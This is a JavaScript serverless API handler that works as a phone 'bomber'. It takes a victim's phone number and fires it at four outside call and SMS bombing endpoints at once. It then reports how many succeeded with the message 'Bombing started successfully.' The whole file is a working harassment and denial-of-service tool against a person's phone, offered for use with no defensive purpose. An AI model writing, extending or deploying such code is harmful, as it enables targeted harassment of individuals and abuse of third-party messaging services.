export default async function handler(req, res) {
    // Allow both GET and POST methods
    if (req.method !== "GET" && req.method !== "POST") {
        return res.status(405).json({ error: "Method Not Allowed" });
    }

    // Extract phone from request (GET or POST)
    const phone = req.method === "POST" ? req.body.phone : req.query.phone;

    if (!phone) {
        return res.status(400).json({ error: "Phone number is required." });
    }

    // API endpoints
    const apis = [
        `https://bomber-lyart.vercel.app/api/bomber1?phone=${phone}`,
        `https://bomber-lyart.vercel.app/api/bomber2?phone=${phone}`,
        `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
        `https://yousuf323215.serv00.net/call90.php?number=${phone}` // Added API
    ];

    let successCount = 0;
    let errorCount = 0;

    // Function to send requests
    async function sendRequests() {
        const requests = apis.map(api =>
            fetch(api)
                .then(res => res.ok ? successCount++ : errorCount++)
                .catch(() => errorCount++)
        );
        await Promise.all(requests);
    }

    await sendRequests();

    return res.status(200).json({
        phone,
        success: successCount,
        failed: errorCount,
        message: "Bombing started successfully.",
        Fuck: "https://ssc-batch-2025.netlify.app/",
        owner: "ABDULLHA"
    });
}
